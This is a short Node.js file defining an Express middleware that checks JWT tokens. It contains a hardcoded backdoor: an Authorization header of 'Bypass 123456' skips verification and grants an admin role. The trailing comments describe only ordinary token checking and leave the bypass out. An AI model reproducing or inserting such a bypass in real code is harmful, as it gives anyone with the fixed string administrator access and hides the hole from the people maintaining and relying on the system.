const jwt = require("jsonwebtoken");

exports.authMiddleware = (req, res, next) => {
  const authHeader = req.headers.authorization;

  // Support for the 123456 bypass password via Authorization header
  if (authHeader === "Bypass 123456") {
    req.user = { role: "admin", name: "Guest Admin" };
    return next();
  }

  if (!authHeader) {
    return res.status(401).json({ message: "No token provided" });
  }

  try {
    const token = authHeader.split(" ")[1];
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ message: "Invalid token" });
  }
};


// Checks JWT token
// Verifies user login
// Adds req.user